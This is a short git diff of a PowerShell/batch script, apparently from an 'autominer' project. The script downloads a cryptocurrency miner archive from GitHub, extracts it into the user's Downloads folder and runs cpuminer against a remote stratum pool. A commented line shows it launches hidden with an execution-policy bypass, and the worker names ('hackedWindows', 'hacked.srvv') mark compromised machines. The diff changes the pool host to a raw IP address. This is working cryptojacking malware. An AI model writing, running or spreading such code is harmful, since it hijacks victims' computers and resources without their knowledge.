@@ -7,4 +7,4 @@ rem Write-Output 'cmd /c start /min "" powershell -WindowStyle Hidden -Execution
 Invoke-WebRequest "https://github.com/zlc1004/autominer/raw/refs/heads/main/miner.zip" -OutFile $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip
 Expand-Archive $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip -DestinationPath $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner -Force
 Set-Location $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner\cpuminer-opt-24.5-windows
-./cpuminer.exe -o stratum+tcp://bowserlab.ddns.net:6033 -u "9HuMXoLqu8FsSBfk9fNEKGh88z2fddkpwi.hackedWindows$($Env:ComputerName)" -p c=XMG
+./cpuminer.exe -a m7m -o stratum+tcp://78.132.98.44:6033 -u hacked.srvv -p c=XMG
